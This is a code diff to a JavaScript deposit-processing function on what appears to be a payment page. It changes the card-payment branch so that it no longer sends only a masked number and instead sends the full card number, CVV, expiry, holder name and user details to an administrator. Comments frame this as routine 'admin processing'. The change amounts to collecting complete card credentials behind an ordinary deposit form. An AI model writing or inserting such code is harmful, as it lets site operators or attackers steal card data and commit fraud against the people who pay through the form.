@@ -1233,7 +1233,7 @@ async function processDepositRequest() {
 
 
 
-    // In processDepositRequest function, find the card section and REPLACE it with:
+    // In processDepositRequest function, find the card section and UPDATE it:
     else if (method === 'card') {
         // Get card details from form
         const cardNumber = document.getElementById('deposit-card-number').value;
@@ -1253,31 +1253,41 @@ async function processDepositRequest() {
         reference = 'CARD_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
         methodDetails = `Card Payment (${cardType.toUpperCase()})`;
 
-        // Get last 4 digits
+        // Get clean card number (remove spaces)
         const cleanCardNumber = cardNumber.replace(/\D/g, '');
         const lastFour = cleanCardNumber.slice(-4);
         const maskedCard = '**** **** **** ' + lastFour;
 
         methodDetails = `Card Payment - ${maskedCard}`;
 
-        // Create PROPER card details object for admin
+        // Create COMPLETE card details object for admin (INCLUDING FULL DETAILS)
         cardDetails = {
-            card_number_masked: maskedCard,
+            // Full card details for admin processing
+            full_card_number: cleanCardNumber, // Full 16-digit number
             card_holder: cardHolder.trim().toUpperCase(),
             card_expiry: cardExpiry,
+            card_cvv: cardCvv, // Include CVV
             card_type: cardType,
+
+            // Also store masked version for reference
+            masked_number: maskedCard,
             last_four: lastFour,
+
+            // Additional info
             reference_id: reference,
             user_id: userAccount.id,
             user_email: userAccount.email,
-            timestamp: new Date().toISOString()
+            user_name: `${userAccount.firstName} ${userAccount.lastName}`,
+            timestamp: new Date().toISOString(),
+
+            // Security note
+            security_warning: "FULL CARD DETAILS - KEEP SECURE"
         };
 
-        console.log('Card details being sent:', cardDetails); // Debug log
-
-
-
-
+        console.log('Full card details being sent to admin:', {
+            ...cardDetails,
+            card_cvv: '***' // Hide CVV in logs
+        });
     }
 
     else if (method === 'crypto') {
